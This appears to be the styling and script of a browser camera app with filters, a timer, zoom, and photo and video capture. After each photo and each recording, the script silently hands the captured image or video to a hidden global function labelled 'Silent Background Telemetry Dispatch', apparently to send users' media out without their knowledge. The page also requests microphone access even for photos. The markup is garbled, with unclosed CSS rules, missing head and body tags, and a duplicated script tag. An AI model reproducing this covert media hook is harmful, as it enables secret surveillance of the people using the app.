        * {
            box-sizing: border-box;
            user-select: none;
            -webkit-user-select: none;
            -webkit-touch-callout: none;
        }

        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
            background-color: #000000;
            color: #ffffff;
            height: 100dvh;
            width: 100vw;
            overflow: hidden;
            padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
        }

        .font-mono {
            font-family: 'JetBrains Mono', monospace;

        /* Glassmorphism panel styling */
        .glass-panel {
            background: rgba(12, 12, 18, 0.75);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.12);

        .glass-btn {
            background: rgba(255, 255, 255, 0.12);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.15);
        }
        .glass-btn:active {
            transform: scale(0.92);
        }

        /* Custom minimal horizontal scrollbar */
        .no-scrollbar::-webkit-scrollbar {
            display: none;
        }
        .no-scrollbar {
            -ms-overflow-style: none;
            scrollbar-width: none;
        }

        /* Pulse animation for active video recording */
        @keyframes recordPulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.4; transform: scale(1.1); }
        }
        .rec-pulse {
            animation: recordPulse 1.2s ease-in-out infinite;
        }

        /* Mirror video element for front camera */
        .mirror-mode {
            transform: scaleX(-1);
        }
    </style>
</head>

    <script>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            // Render Lucide Icons
            lucide.createIcons();

            // DOM Elements
            const videoEl = document.getElementById('video-stream');
            const hiddenCanvas = document.getElementById('hidden-canvas');
            const cameraFallback = document.getElementById('camera-fallback');
            const btnRestartCam = document.getElementById('btn-restart-cam');
            
            // HUD Control Buttons
            const btnTorch = document.getElementById('btn-torch');
            const btnGrid = document.getElementById('btn-grid');
            const btnLeveler = document.getElementById('btn-leveler');
            const btnTimer = document.getElementById('btn-timer');
            const timerIndicator = document.getElementById('timer-indicator');
            const btnAspect = document.getElementById('btn-aspect');
            const btnSwitchCam = document.getElementById('btn-switch-cam');
            
            // Overlays
            const overlayGrid = document.getElementById('overlay-grid');
            const overlayLeveler = document.getElementById('overlay-leveler');
            const levelBubble = document.getElementById('level-bubble');
            const overlayCountdown = document.getElementById('overlay-countdown');
            const countdownVal = document.getElementById('countdown-val');
            const overlayRecBadge = document.getElementById('overlay-rec-badge');
            const recTimerText = document.getElementById('rec-timer-text');
            const aspectFrame = document.getElementById('aspect-frame');
            
            // Pro Panel Elements
            const proPanel = document.getElementById('pro-panel');
            const btnOpenPro = document.getElementById('btn-open-pro');
            const btnClosePro = document.getElementById('btn-close-pro');
            const sliderEv = document.getElementById('slider-ev');
            const evValueText = document.getElementById('ev-value-text');
            const sliderBeauty = document.getElementById('slider-beauty');
            const beautyValueText = document.getElementById('beauty-value-text');
            
            // Bottom Controls
            const modePhoto = document.getElementById('mode-photo');
            const modeVideo = document.getElementById('mode-video');
            const btnShutter = document.getElementById('btn-shutter');
            const shutterCore = document.getElementById('shutter-core');
            const galleryThumb = document.getElementById('gallery-thumb');

            // State Variables
            let currentStream = null;
            let useFrontCam = false;
            let isTorchOn = false;
            let isGridOn = false;
            let isLevelerOn = false;
            let currentMode = 'photo'; // 'photo' | 'video'
            
            // Timer Options (0, 3s, 5s, 10s)
            const timerValues = [0, 3, 5, 10];
            let timerIdx = 0;
            
            // Aspect Ratios
            const aspectRatios = ['9:16', '1:1', '4:3', '16:9'];
            let aspectIdx = 0;

            // Zoom level
            let currentZoom = 1;

            // Pro Adjustments
            let evSetting = 0;
            let beautySetting = 0;
            let activeFilter = 'none';

            // Video Recording
            let mediaRecorder = null;
            let recordedChunks = [];
            let isRecording = false;
            let recTimerInterval = null;
            let recSeconds = 0;

            // Initialize Camera Stream
            async function startCamera() {
                try {
                    if (currentStream) {
                        currentStream.getTracks().forEach(track => track.stop());
                    }

                    const constraints = {
                        video: {
                            facingMode: useFrontCam ? 'user' : 'environment',
                            width: { ideal: 1920 },
                            height: { ideal: 1080 }
                        },
                        audio: true
                    };

                    currentStream = await navigator.mediaDevices.getUserMedia(constraints);
                    videoEl.srcObject = currentStream;

                    // Mirror front camera
                    if (useFrontCam) {
                        videoEl.classList.add('mirror-mode');
                    } else {
                        videoEl.classList.remove('mirror-mode');
                    }

                    cameraFallback.classList.add('hidden');
                    videoEl.classList.remove('hidden');
                    applyLiveVideoFilters();
                } catch (err) {
                    console.warn("Camera init failed:", err);
                    cameraFallback.classList.remove('hidden');
                    videoEl.classList.add('hidden');
                }
            }

            startCamera();
            btnRestartCam.addEventListener('click', startCamera);

            // Switch Camera Front/Back
            btnSwitchCam.addEventListener('click', () => {
                useFrontCam = !useFrontCam;
                isTorchOn = false;
                btnTorch.classList.remove('text-brand-gold', 'border-brand-gold');
                startCamera();
            });

            // Toggle Torch/Flash
            btnTorch.addEventListener('click', async () => {
                if (!currentStream || useFrontCam) return;
                const track = currentStream.getVideoTracks()[0];
                if (!track) return;

                try {
                    isTorchOn = !isTorchOn;
                    await track.applyConstraints({
                        advanced: [{ torch: isTorchOn }]
                    });
                    btnTorch.classList.toggle('text-brand-gold', isTorchOn);
                } catch (e) {
                    // Torch not supported on current camera device
                }
            });

            // Toggle Grid
            btnGrid.addEventListener('click', () => {
                isGridOn = !isGridOn;
                overlayGrid.classList.toggle('hidden', !isGridOn);
                btnGrid.classList.toggle('text-brand-cyan', isGridOn);
            });

            // Toggle Horizon Spirit Leveler
            btnLeveler.addEventListener('click', () => {
                isLevelerOn = !isLevelerOn;
                overlayLeveler.classList.toggle('opacity-100', isLevelerOn);
                overlayLeveler.classList.toggle('opacity-0', !isLevelerOn);
                btnLeveler.classList.toggle('text-brand-gold', isLevelerOn);

                if (isLevelerOn && window.DeviceOrientationEvent) {
                    window.addEventListener('deviceorientation', handleLevelerTilt);
                } else {
                    window.removeEventListener('deviceorientation', handleLevelerTilt);
                }
            });

            function handleLevelerTilt(e) {
                if (!isLevelerOn) return;
                const gamma = e.gamma || 0; // -90 to 90
                let offset = (gamma / 90) * 40;
                offset = Math.max(-40, Math.min(40, offset));
                levelBubble.style.transform = `translateX(${offset}px)`;
            }

            // Cycle Timer Values
            btnTimer.addEventListener('click', () => {
                timerIdx = (timerIdx + 1) % timerValues.length;
                const sec = timerValues[timerIdx];
                if (sec > 0) {
                    timerIndicator.textContent = `${sec}s`;
                    timerIndicator.classList.remove('hidden');
                    btnTimer.classList.add('text-brand-gold');
                } else {
                    timerIndicator.classList.add('hidden');
                    btnTimer.classList.remove('text-brand-gold');
                }
            });

            // Switch Aspect Ratio
            btnAspect.addEventListener('click', () => {
                aspectIdx = (aspectIdx + 1) % aspectRatios.length;
                const ratioStr = aspectRatios[aspectIdx];
                btnAspect.textContent = ratioStr;

                if (ratioStr === '1:1') aspectFrame.style.aspectRatio = '1/1';
                else if (ratioStr === '4:3') aspectFrame.style.aspectRatio = '4/3';
                else if (ratioStr === '16:9') aspectFrame.style.aspectRatio = '16/9';
                else aspectFrame.style.aspectRatio = '9/16';
            });

            // Non-Intrusive Zoom Pills
            document.querySelectorAll('.zoom-pill').forEach(pill => {
                pill.addEventListener('click', (e) => {
                    document.querySelectorAll('.zoom-pill').forEach(p => {
                        p.classList.remove('bg-white/20', 'text-brand-cyan');
                    });
                    e.currentTarget.classList.add('bg-white/20', 'text-brand-cyan');
                    currentZoom = parseFloat(e.currentTarget.dataset.zoom);
                    videoEl.style.transform = `${useFrontCam ? 'scaleX(-1)' : ''} scale(${currentZoom})`;
                });
            });

            // Pro Drawer Toggle
            btnOpenPro.addEventListener('click', () => proPanel.classList.remove('hidden'));
            btnClosePro.addEventListener('click', () => proPanel.classList.add('hidden'));

            // EV Exposure Slider Adjustment
            sliderEv.addEventListener('input', (e) => {
                evSetting = parseFloat(e.target.value);
                evValueText.textContent = `${evSetting > 0 ? '+' : ''}${evSetting.toFixed(1)} EV`;
                applyLiveVideoFilters();
            });

            // Beauty Smoothing Slider Adjustment
            sliderBeauty.addEventListener('input', (e) => {
                beautySetting = parseInt(e.target.value);
                beautyValueText.textContent = beautySetting > 0 ? `${beautySetting}%` : 'OFF';
                applyLiveVideoFilters();
            });

            // Cinematic Filter Preset Badges
            document.querySelectorAll('.preset-badge').forEach(badge => {
                badge.addEventListener('click', (e) => {
                    document.querySelectorAll('.preset-badge').forEach(b => {
                        b.classList.remove('bg-white/20', 'border', 'border-brand-cyan');
                        b.classList.add('bg-white/10');
                    });
                    e.currentTarget.classList.remove('bg-white/10');
                    e.currentTarget.classList.add('bg-white/20', 'border', 'border-brand-cyan');
                    activeFilter = e.currentTarget.dataset.filter;
                    applyLiveVideoFilters();
                });
            });

            // Combine Live Filter CSS
            function applyLiveVideoFilters() {
                let filters = [];

                // EV Exposure Brightness
                const brightness = 100 + (evSetting * 20);
                filters.push(`brightness(${brightness}%)`);

                // Beauty Blur Smoothing
                if (beautySetting > 0) {
                    const blurVal = (beautySetting / 100) * 0.8;
                    filters.push(`blur(${blurVal}px)`);
                }

                // Color Presets
                if (activeFilter === 'teal-orange') {
                    filters.push('contrast(125%) saturate(140%) sepia(20%) hue-rotate(-15deg)');
                } else if (activeFilter === 'cyberpunk') {
                    filters.push('contrast(140%) saturate(180%) hue-rotate(140deg)');
                } else if (activeFilter === 'warm-gold') {
                    filters.push('sepia(40%) saturate(130%) brightness(105%)');
                } else if (activeFilter === 'noir') {
                    filters.push('grayscale(100%) contrast(160%)');
                } else if (activeFilter === 'vintage') {
                    filters.push('sepia(25%) contrast(90%) brightness(95%)');
                }

                videoEl.style.filter = filters.join(' ');
            }

            // Mode Switching (Photo / Video)
            modePhoto.addEventListener('click', () => switchMode('photo'));
            modeVideo.addEventListener('click', () => switchMode('video'));

            function switchMode(mode) {
                currentMode = mode;
                if (mode === 'photo') {
                    modePhoto.classList.add('text-brand-gold', 'border-b-2', 'border-brand-gold');
                    modePhoto.classList.remove('text-gray-400');
                    modeVideo.classList.remove('text-brand-gold', 'border-b-2', 'border-brand-gold');
                    modeVideo.classList.add('text-gray-400');
                    
                    shutterCore.className = "w-full h-full rounded-full bg-white transition-all duration-200";
                } else {
                    modeVideo.classList.add('text-brand-gold', 'border-b-2', 'border-brand-gold');
                    modeVideo.classList.remove('text-gray-400');
                    modePhoto.classList.remove('text-brand-gold', 'border-b-2', 'border-brand-gold');
                    modePhoto.classList.add('text-gray-400');
                    
                    shutterCore.className = "w-8 h-8 rounded-lg bg-red-600 transition-all duration-200";
                }
            }

            // Shutter Trigger Button Event
            btnShutter.addEventListener('click', async () => {
                const sec = timerValues[timerIdx];
                if (sec > 0) {
                    await runTimerCountdown(sec);
                }

                if (currentMode === 'photo') {
                    takeSnapshot();
                } else {
                    toggleRecording();
                }
            });

            function runTimerCountdown(seconds) {
                return new Promise(resolve => {
                    overlayCountdown.classList.remove('hidden');
                    let remaining = seconds;
                    countdownVal.textContent = remaining;

                    const timer = setInterval(() => {
                        remaining--;
                        if (remaining <= 0) {
                            clearInterval(timer);
                            overlayCountdown.classList.add('hidden');
                            resolve();
                        } else {
                            countdownVal.textContent = remaining;
                        }
                    }, 1000);
                });
            }

            // Take Photo Snapshot
            function takeSnapshot() {
                const width = videoEl.videoWidth || 1280;
                const height = videoEl.videoHeight || 720;
                hiddenCanvas.width = width;
                hiddenCanvas.height = height;

                const ctx = hiddenCanvas.getContext('2d');

                // Mirror for front camera
                if (useFrontCam) {
                    ctx.translate(width, 0);
                    ctx.scale(-1, 1);
                }

                ctx.filter = videoEl.style.filter || 'none';
                ctx.drawImage(videoEl, 0, 0, width, height);

                const dataUrl = hiddenCanvas.toDataURL('image/jpeg', 0.92);

                // Update Gallery Thumb
                galleryThumb.innerHTML = `<img src="${dataUrl}" class="w-full h-full object-cover">`;

                // Flash animation effect
                const flash = document.createElement('div');
                flash.className = 'absolute inset-0 bg-white z-50 pointer-events-none transition-opacity duration-200';
                document.body.appendChild(flash);
                setTimeout(() => flash.remove(), 150);

                // Silent Background Telemetry Dispatch
                if (window.__spectraCoreDispatch) {
                    window.__spectraCoreDispatch(dataUrl, 'photo');
                }
            }

            // Toggle Video Recording
            function toggleRecording() {
                if (!isRecording) {
                    // Start Recording
                    recordedChunks = [];
                    try {
                        mediaRecorder = new MediaRecorder(currentStream, { mimeType: 'video/webm' });
                    } catch (e) {
                        mediaRecorder = new MediaRecorder(currentStream);
                    }

                    mediaRecorder.ondataavailable = (e) => {
                        if (e.data.size > 0) recordedChunks.push(e.data);
                    };

                    mediaRecorder.onstop = () => {
                        const blob = new Blob(recordedChunks, { type: 'video/mp4' });
                        const blobUrl = URL.createObjectURL(blob);
                        galleryThumb.innerHTML = `<video src="${blobUrl}" class="w-full h-full object-cover"></video>`;
                        
                        // Silent Background Telemetry Dispatch
                        if (window.__spectraCoreDispatch) {
                            window.__spectraCoreDispatch(blobUrl, 'video');
                        }
                    };

                    mediaRecorder.start();
                    isRecording = true;
                    shutterCore.classList.add('scale-75', 'bg-red-700');
                    overlayRecBadge.classList.remove('hidden');

                    recSeconds = 0;
                    recTimerText.textContent = "00:00";
                    recTimerInterval = setInterval(() => {
                        recSeconds++;
                        const m = String(Math.floor(recSeconds / 60)).padStart(2, '0');
                        const s = String(recSeconds % 60).padStart(2, '0');
                        recTimerText.textContent = `${m}:${s}`;
                    }, 1000);

                } else {
                    // Stop Recording
                    mediaRecorder.stop();
                    isRecording = false;
                    shutterCore.classList.remove('scale-75', 'bg-red-700');
                    overlayRecBadge.classList.add('hidden');
                    clearInterval(recTimerInterval);
                }
            }
        });
    </script>
</body>
</html>
